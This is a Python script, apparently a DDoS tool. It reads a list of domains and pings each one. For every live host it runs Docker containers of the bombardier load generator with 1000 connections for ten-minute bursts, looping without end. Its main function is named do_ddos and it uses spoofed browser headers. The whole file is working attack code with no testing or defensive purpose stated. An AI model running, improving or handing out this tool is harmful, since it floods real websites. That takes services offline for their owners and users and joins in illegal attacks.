import argparse
import os
import subprocess
from multiprocessing.pool import Pool

INTERVAL_BETWEEN_PING = '10m'
CONNECTIONS_PER_CONTAINER = '1000'
REQUEST_TIMEOUT = '30s'
HEADERS = """
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/12.0;
    Accept-Language: ru-RU;
    Accept-Encoding: gzip, deflate;
    Referer: http://www.google.com/;
"""


def main():
    args = _parse_args()
    hosts = _hosts_from_file(args.file)
    workers = args.workers or len(hosts)
    while True:
        try:
            with Pool(int(workers)) as tp:
                tp.map(do_ddos, hosts)
        except KeyboardInterrupt:
            os.system('docker rm $(docker stop $(docker ps -a -q --filter ancestor=alpine/bombardier --format="{{.ID}}"))')
            raise


def do_ddos(host):
    ping = subprocess.Popen(
            ["ping", "-c", "4", host],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )

    out = ping.communicate()[0]
    if '100% packet loss' in str(out):
        print(host, 'DOWN')
    else:
        print(host, 'ALIVE')
        command = 'docker run --rm alpine/bombardier ' \
            f'--connections {CONNECTIONS_PER_CONTAINER} ' \
            f'--duration {INTERVAL_BETWEEN_PING} ' \
            f'--timeout {REQUEST_TIMEOUT} ' \
            f'-H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/12.0" ' \
            f'-H "Accept-Language: ru-RU" ' \
            f'-H "Accept-Encoding: gzip, deflate" ' \
            f'-l {host} '
        os.system(command)


def _parse_args():
    parser = argparse.ArgumentParser()

    parser.add_argument('--file', help='file with domains names')
    parser.add_argument('--workers', help='Number of created containers')

    args = parser.parse_args()
    return args


def _hosts_from_file(hosts_file_name):
    with open(hosts_file_name, 'r') as file:
        hosts = file.read()
    hosts = hosts.split('\n')
    hosts = [host.strip() for host in hosts if host]
    hosts = list(set(hosts))
    print('Domains: ', len(hosts))
    return hosts


if __name__ == '__main__':
    main()
